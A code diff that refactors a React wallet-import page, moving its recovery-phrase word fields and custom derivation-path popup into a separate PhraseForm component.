@@ -1,5 +1,6 @@
 import { useRef, useState, type FormEvent } from "react";
 import { Link } from "react-router";
+import { PhraseForm } from "../components/PhraseForm";
 
 const tabData = [
     { type: "phrase-12", label: "12 word" },
@@ -7,107 +8,6 @@ const tabData = [
     { type: "phrase-key", label: "Private key" },
 ]
 
-type WordFieldProps = {
-    index: number;
-    value: string;
-    onChange: (index: number, value: string) => void;
-    onKeyDown: (e: React.KeyboardEvent<HTMLInputElement>, index: number) => void;
-    onPaste: (e: React.ClipboardEvent<HTMLInputElement>, index: number) => void;
-};
-
-function WordField({ index, value, onChange, onKeyDown, onPaste }: WordFieldProps) {
-    const [show, setShow] = useState(false);
-
-    return (
-        <div className="login__field-item">
-            <div className="login__field-number">{index + 1}.</div>
-            <input
-                type={show ? "text" : "password"}
-                name={`word${index + 1}`}
-                className="login__input js-login-field"
-                value={value}
-                onChange={(e) => onChange(index, e.target.value)}
-                onFocus={() => setShow(true)}
-                onBlur={() => setShow(false)}
-                onKeyDown={(e) => onKeyDown(e, index)}
-                onPaste={(e) => onPaste(e, index)}
-            />
-        </div>
-    );
-}
-
-type HdPathPopupProps = {
-    visible: boolean;
-    onClose: () => void;
-};
-
-function HdPathPopup({ visible, onClose }: HdPathPopupProps) {
-    const [inputs, setInputs] = useState(["0", "0", "0"]);
-    const [confirmVisible, setConfirmVisible] = useState(false);
-
-    if (!visible) return null;
-
-    const handleChange = (i: number, value: string) => {
-        const cleaned = value.replace(/[^0-9.]/g, "");
-        const dots = cleaned.split(".").length - 1;
-        const finalValue = dots > 1 ? cleaned.split(".")[0] + "." + cleaned.split(".").slice(1).join("") : cleaned;
-
-        setInputs((prev) => prev.map((v, idx) => (idx === i ? finalValue : v)));
-    };
-
-    const handleClose = () => setConfirmVisible(true);
-    const handleYes = () => {
-        setInputs(["0", "0", "0"]);
-        setConfirmVisible(false);
-        onClose();
-    };
-    const handleCancel = () => setConfirmVisible(false);
-
-    return (
-        <div className="popup">
-            <button className="popup__close-btn btn" type="button" onClick={handleClose}>
-                ✕
-            </button>
-            <div className="popup__title">Set Custom Derivation Path</div>
-            <div className="popup__desc">
-                <span>•</span>You can create multiple addresses from one recovery phrase
-                <br />
-                <span>•</span>A lost path cannot be recovered
-                <br />
-                <span>•</span>If you're unfamiliar with this feature, skip or undo this step - Reset Settings
-            </div>
-            <div className="popup__bottom-fields">
-                <span>m/-'/-'/</span>
-                {inputs.map((v, i) => (
-                    <span key={i}>
-                        <input
-                            className="input js-popup-input js-field"
-                            value={v}
-                            onChange={(e) => handleChange(i, e.target.value)}
-                        />
-                        {i < 2 && <span className="popup__separator">'/</span>}
-                    </span>
-                ))}
-            </div>
-
-            {confirmVisible && (
-                <div className="global-popup">
-                    <div className="global-popup__wrapper">
-                        <div className="global-popup__text">Closing this box will reset the HD Path. Are you sure you want to proceed?</div>
-                        <div className="global-popup__btns">
-                            <button id="yes" className="btn global-popup__btn global-popup__btn-grey" onClick={handleCancel}>
-                                Cancel
-                            </button>
-                            <button id="cancel" className="btn global-popup__btn global-popup__btn-blue" onClick={handleYes}>
-                                Yes
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            )}
-        </div>
-    );
-}
 
 
 export default function Phrase() {
@@ -199,30 +99,16 @@ export default function Phrase() {
                     </div>
 
                     {activeType !== "phrase-key" ? (
-                        <form className="login__form" onSubmit={handleSubmit}>
-                            <div className={`login__fields ${wordCount === 24 ? 'login__fields-24' : ''}`}>
-                                {Array.from({ length: wordCount }).map((_, i) => (
-                                    <WordField
-                                        key={i}
-                                        index={i}
-                                        value={words[i]}
-                                        onChange={handleWordChange}
-                                        onKeyDown={handleKeyDown}
-                                        onPaste={handlePaste}
-                                        ref={(el) => (inputsRef.current[i] = el)}
-                                    />
-                                ))}
-                            </div>
-
-                            {!hdPathVisible && <button type="button" className="btn login__path-btn" onClick={() => setHdPathVisible(true)}>
-                                Set Derivation Path (Advanced)
-                            </button>}
-                            <HdPathPopup visible={hdPathVisible} onClose={() => setHdPathVisible(false)} />
-
-                            <button type="submit" className="login__submit-btn btn btn--one" disabled={!words.slice(0, wordCount).every(Boolean)}>
-                                Import
-                            </button>
-                        </form>
+                        <PhraseForm
+                            hdPathVisible={hdPathVisible}
+                            setHdPathVisible={setHdPathVisible}
+                            wordCount={wordCount}
+                            words={words}
+                            onWordChange={handleWordChange}
+                            onKeyDown={handleKeyDown}
+                            onPaste={handlePaste}
+                            onHdPathClick={() => setHdPathVisible(true)}
+                        />
                     ) : (
                         <form className="login__form" onSubmit={handleSubmit}>
                             <input type="text" id="key" className="input" value={key} onChange={(e) => setKey(e.target.value)} />
